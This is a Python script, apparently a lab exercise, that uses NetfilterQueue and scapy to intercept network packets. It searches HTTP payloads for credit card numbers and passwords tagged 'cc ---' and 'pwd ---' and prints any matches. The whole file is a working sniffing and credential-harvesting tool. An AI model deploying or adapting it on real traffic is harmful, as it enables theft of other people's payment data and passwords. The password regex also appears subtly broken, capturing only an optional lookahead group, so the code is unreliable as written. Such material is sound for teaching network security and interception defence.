from netfilterqueue import NetfilterQueue
from scapy.all import *
import socket
import re

def print_and_accept(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer(Raw):
        http = ip[Raw].load.decode()
        
        cc_re = re.compile('.*cc --- (\d{4}\.\d{4}\.\d{4}\.\d{4}).*')
        pwd_re = re.compile('.*pwd --- (?=\d*)(?=[A-Z]*)(?=(:|;|<|=|>|\?|@)*).*')
        
        cc = cc_re.search(http)
        pwd = pwd_re.search(http)

        if cc:
            print("Matched CC")
            print(cc.group(1))
        
        elif pwd:
            print("Matched pwd")
            print(pwd.group(1))
            
        else:
            print("Nothing interesting in this packet")
    
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
try:
    nfqueue.run_socket(s)
except KeyboardInterrupt:
    print('')

s.close()
nfqueue.unbind()